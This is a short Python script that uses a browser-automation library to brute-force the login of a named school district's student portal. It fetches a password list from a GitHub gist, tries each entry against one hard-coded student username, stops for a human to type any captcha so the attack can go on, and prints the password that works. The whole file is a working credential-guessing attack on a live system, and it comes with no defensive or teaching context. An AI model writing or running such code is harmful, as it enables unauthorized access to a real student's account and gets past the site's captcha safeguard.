from webbot import Browser
import functions
import time

web = Browser()
web.go_to("https://sanjoseca.infinitecampus.org/campus/portal/students/sanjose.jsp")
loggedIn = False
gistApiLink = "https://api.github.com/gists/79c6ffd3e861e6af983ff58e71f31980"
passList = functions.readGist(gistApiLink)
captcha = "not found"

while loggedIn == False:
  
  for password in passList:
    web.scrolly(200)
    print(password)
    if web.get_current_url().find("captcha") != -1 and captcha == "not found":
        print("Captcha detected!")
        captcha = input("Enter the captcha here: ")
    web.click(id="username")
    web.type("s213613")
    #time.sleep(1)
    web.click(id="password")
    web.type(password)
    #time.sleep(1)
    if captcha == "not found":
      web.press(web.Key.ENTER)
    else:
      #time.sleep(1)
      web.click(id="cinput")
      web.type(captcha)
      #time.sleep(1)
      web.press(web.Key.ENTER)
      
    
    if web.get_current_url() == "https://sanjoseca.infinitecampus.org/campus/nav-wrapper/student/portal/student/today":
      print("Login successful!")
      correctPassword = password
      print(f"Logged in! Password is {password}")
      loggedIn = True
      break
      
    
  

